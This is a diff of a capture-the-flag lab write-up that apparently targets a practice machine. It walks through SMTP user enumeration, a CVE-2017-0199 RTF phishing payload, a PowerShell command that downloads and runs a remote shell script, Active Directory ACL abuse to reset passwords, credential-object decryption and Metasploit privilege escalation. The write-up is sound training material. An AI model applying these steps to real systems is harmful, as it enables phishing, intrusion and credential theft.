@@ -14,7 +14,7 @@
 ---
 
 ### Nmap
-Checking the `nmap` scan, we find very few ports running:
+*Checking the* `nmap` *scan,* we find very few ports running:
 ```
 PORT   STATE SERVICE VERSION                                                                                      
 21/tcp open  ftp     Microsoft ftpd                                                                               
@@ -62,10 +62,10 @@ PORT   STATE SERVICE VERSION
 ```
 
 ### Anonymous FTP
-Checking FTP, we come across 3 files:
-- Applocker.docx
-- readme.txt
-- Windows Event Forwarding.docx
+*Checking* **FTP**, we come across 3 files:
+- `Applocker.docx`
+- `readme.txt`
+- `Windows Event Forwarding.docx`
 
 ![ftp-listing](ftp-listing.jpg)
 
@@ -79,20 +79,20 @@ new format / converted documents will be saved here.
 ### Looks like we're going phishing :D
 the content is about someone asking to be emailed RTF formats (a type of document) for him/her to review and convert.
 
-This seems like a phishing challenge. We need to:
+This seems like a **Phishing Challenge**. *In order to exploit,* we need to:
 1. Find out who that user is
 2. Find a way to create a malicious RTF file
-3. Find a way to send emails using the open SMTP port
+3. Find a way to send an email using the open SMTP port
 
 ### Enumerating SMTP
 We use a tool called `smtp-user-enum` which lets us find if a given user exists or not.
 
-It uses a couple of SMTP commands to do that:
+It uses a couple of **SMTP** commands to do that:
 1. VRFY
 2. EXPN
 3. RCPT
 
-we give it a list of male/female names from the `SecLists` Github Repo to try while we look at how to create a malicious document.
+we give it a list of male/female names from the **SecLists** Github Repo to try while we look at how to create a malicious document.
 
 ![male-female-wordlists](male-female-wordlists.jpg)
 
@@ -100,7 +100,7 @@ the command is:
 
 `smtp-user-enum -M VRFY -U users.txt -t 10.10.10.77`
 
-That takes a while to run. And it comes up short. So we move on.
+That takes a while to run. And it comes up short. *So we move on...*
 
 ### Checking file metadata using `exiftool`
 
@@ -112,11 +112,11 @@ we note this down and go to verify this user using `smtp-user-enum`
 
 ### Trying various SMTP methods for enumeration
 
-when testing mulitple methods with the `nico` user, we still get no hits.
+*when testing mulitple methods with the* `nico` *user*, we still get no hits :/
 
-However, we do get a verification when add the `-D` flag and supply `megabank.com` as the domain.
+*However,* we do get a verification when add the `-D` flag and supply `megabank.com` as the domain.
 
-But this is only with the `RCPT` method:
+But only with the `RCPT` method:
 
 ![nico-vrfy](nico-vrfy.jpg)
 
@@ -124,21 +124,21 @@ But this is only with the `RCPT` method:
 
 ![nico-rcpt](nico-rcpt.jpg)
 
-### Working on the phish
+### Working on the Phish
 
-Doing a google search shows an article about CVE-2017-0199 which looks promising.
+Doing a **Google** search shows an article about **CVE-2017-0199** which looks promising.
 
 ![rtf-exploit-search](rtf-exploit-search.jpg)
 
-According to the article, we should clone a repo (https://github.com/bhdresh/CVE-2017-0199.git) to get a python script.
+*According to the article,* we should clone a repo (https://github.com/bhdresh/CVE-2017-0199.git) to get a **python** script.
 
 We look at the help:
 
 ![cve-2017-0199-python](cve-2017-0199-python.jpg)
 
-We need to first generate a malicious `RTF` document using the first mode `gen` and supply a url of an `HTA` file to achieve code execution.
+We need to generate a malicious `RTF` document using the first mode `gen` and supply a url of an `HTA` file to achieve code execution.
 
-Let's generate the evil `HTA` file using `msfvenom`
+Let's first create the evil `HTA` file using `msfvenom`
 
 ![evil-hta](evil-hta.jpg)
 
@@ -153,7 +153,7 @@ We host the payload on our kali machine using a standard `python3` webserver and
 What's left is to send the email to `nico@megabank.com`
 
 ### Sending the mail and some deception ;)
-we're going to use the `sendEmail` command with a couple flags:
+We're going to use the `sendEmail` command with a couple flags:
 - `-t <RECEPIENT>`
 - `-f <SENDER>`
 - `-s <SMTP_SERVER>`
@@ -191,7 +191,7 @@ Having everything ready, we trigger the chain:
 
 The guide talks about using an `exe` file. We cannot do so because of `Applocker`.
 
-It was mentioned that the user has set up hash rules for multiple file types:
+We know this because was mentioned that the user has set up hash rules for multiple file types:
 
 ![Applocker-docx](Applocker-docx.jpg)
 
@@ -199,19 +199,19 @@ This is why we generated an HTA payload using `msfvenom` instead.
 
 ### Domain Enumeration using `SharpHound.ps1`
 
-Since running `.exe` is disabled using Group Policy, we turn to `BloodHound`'s PowerShell injestor (https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) and run the `Invoke-BloodHound` method.
+*Since running* `.exe` *is disabled by* **Group Policy**, we turn to `BloodHound`'s **PowerShell injestor** (https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) and run the `Invoke-BloodHound` method.
 
-Switching to powershell from cmd can be done with the below command using the famous nishang shell (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the `Invoke-PowerShellTcp` call at the bottom of the `.ps1`
+Switching to PowerShell from CMD can be done with the below command using the famous **Nishang shell** (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the `Invoke-PowerShellTcp` call at the bottom of the `.ps1`
 
 `powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"`
 
 ### A note on `SharpHound.ps1` output:
 
-`Sharphound.ps1` will generate version 3 `JSON` files. Those will not be compatible with the most recent version of BloodHound (currently it's at 4).
+`Sharphound.ps1` will generate version 3 `JSON` files. Those *will not be compatible* with the most recent version of **BloodHound** (currently it's at 4).
 
 ![sharphound-ps1-json-version](sharphound-ps1-json-version.jpg)
 
-To get it working, we will need to get `BloodHound` version 3 from the official releases page (https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.3)
+*To get it working,* we will need to get `BloodHound` version 3 from the **Official Releases Page** (https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.3)
 
 ### Investigating Possible Exploit Paths
 
@@ -219,21 +219,21 @@ Upon looking at `BloodHound`'s output, we notice that `nico` can set the `owner`
 
 ![nico-can-write-owner](nico-can-write-owner.jpg)
 
-Simulating having owned the user `herman`, we notice we can reach the `backup_admins` group.
+*Simulating having owned the user* `herman`, we notice we can reach the `backup_admins` group.
 
-This is because the `herman` user has a `WriteDACL` right over the group.
+This is because the `herman` user has a `WriteDACL` right over it.
 
 ![herman-has-write-dacl](herman-has-write-dacl.jpg)
 
 ### Abusing `nico`'s `WriteOwner` right over `herman`
 
-Checking the help for the `WriteOwner` right, we notice we can use `PowerView`'s `Set-DomainObjectOwner` function.
+*Checking the help for the* `WriteOwner` *right*, we notice we can use `PowerView`'s `Set-DomainObjectOwner` function.
 
 ![set-dom-obj-owner](set-dom-obj-owner.jpg)
 
-Command: `Set-DomainObjectOwner -Identity herman -OwnerIdentity nico`
+**Command:** `Set-DomainObjectOwner -Identity herman -OwnerIdentity nico`
 
-We will need to folow with `Add-DomainObjectAcl -TargetIdentity herman -PrincipalIdentity nico -Rights ResetPassword`
+We will need to follow up with `Add-DomainObjectAcl -TargetIdentity herman -PrincipalIdentity nico -Rights ResetPassword`
 
 ![add-dom-object-acl](add-dom-object-acl.jpg)
 
@@ -251,7 +251,7 @@ and set the password:
 
 ### Logging in as herman and joining the `backup_admins` group
 
-After resetting the password for `herman`, we're able to login via the open `SSH` port:
+*After resetting the password for* `herman`, we're able to login via the open `SSH` port:
 
 ![ssh-as-herman](ssh-as-herman.jpg)
 
@@ -261,7 +261,7 @@ and we can add ourselves to the backup_admins easily with `Add-ADGroupMember 'ba
 
 ### File System access with `backup_admins`'s group membership
 
-We first relog to refresh our access and check our newly-found acccess using `PowerShell`:
+We first *relog* to *refresh our access* and check our newly-found acccess using `PowerShell`:
 
 ```
 $ErrorActionPreference = 'silentlycontinue'
@@ -282,3 +282,81 @@ Checking the `BackupScript.ps1` shows a password:
 Using the password `Cr4ckMeIfYouC4n!` works with the administrator user over `SSH`:
 
 ![got-admin-path-1](got-admin-path-1.jpg)
+
+### Exploit Path #2 (`nico` -> `tom` -> `claire` > `backup_admins`)
+
+On `nico`'s desktop we find a file called `cred.xml`
+
+![nico-cred-xml](nico-cred-xml.jpg)
+
+*looking at its contents,* we recognize it's a **PowerShell Credential Object** that has the username and password of `tom`
+
+![ps-cred-object](ps-cred-object.jpg)
+
+A PowerShell credential object is used to execute commands using a different set of creds than that of the current user.
+
+*Without having the password,* we can import the credential object using `Import-Clixml` cmdlet and use it with the PowerShell `Start-Job` cmdlet to launch a `nishang` shell as `tom`
+
+![cred-to-tom](cred-to-tom.jpg)
+
+We can also retrieve the plain text password by using the `GetNetworkCredential` method of the `System.Management.Automation.PSCredential` class:
+
+![get-network-cred-method](get-network-cred-method.jpg)
+
+![toms-password](toms-password.jpg)
+
+The password works for `tom` using `SSH`
+
+![tom-ssh](tom-ssh.jpg)
+
+*Looking at the exploit path from* `tom` *using* `bloodhound`, shows the same path like `nico`
+
+![tom-owner-claire](tom-owner-claire.jpg)
+
+![claire-to-backup-admins](claire-to-backup-admins.jpg)
+
+### Exploit Path #3 Metasploitation
+
+The same exploit for **CVE-2017-0199** exists in a **Metasploit Module** (`windows/fileformat/office_word_hta`) when we search using the `rtf` keyword:
+
+![metasploit-rtf-exploit](metasploit-rtf-exploit.jpg)
+
+setting the options is **critical** here!
+
+We have to set the `SRVHOST` option or else it would create the document and embed our `eth0` IP address into the document (*Troubleshooting this part took me a while*).
+
+![setting-options-msf-exploit](setting-options-msf-exploit.jpg)
+
+We can send the `doc` file to the victim and he would still open it (*I didn't realise this at first and used a* `.DOC` *to* `.RTF` *converter*).
+
+![msf-doc](msf-doc.jpg)
+
+![got-meterpreter](got-meterpreter.jpg)
+
+We will then use `Metasploit`'s `local exploit suggester` *after migrating to a 64-bit process.*
+
+![x86-meterpreter](x86-meterpreter.jpg)
+
+![migrating-to-64-meterpreter](migrating-to-64-meterpreter.jpg)
+
+The module finds the host to be *vulnerable* to `CVE-2019-1458` also know as **Wizard Opium**.
+
+![msf-exp-suggester](msf-exp-suggester.jpg)
+
+which works like a charm XD
+
+![wizard-opium-works](wizard-opium-works.jpg)
+
+another exploit that worked is `CVE-2018-8440`
+
+![msf-alpc-privesc](msf-alpc-privesc.jpg)
+
+Of course these paths are not intended because it's just using `MetaSploit`
+
+### Incomplete Exploit Path #4 `SeLoadDriverPrivilege`
+
+The `tom` user is a member of the `Print Operators` Group which hold the `SeLoadDriverPrivilege`
+
+![print-ops-and-load-driver](print-ops-and-load-driver.jpg)
+
+*However,* exploiting this seems relatively complex and difficult to achieve specially with the **Group Policy** restrictions in place.
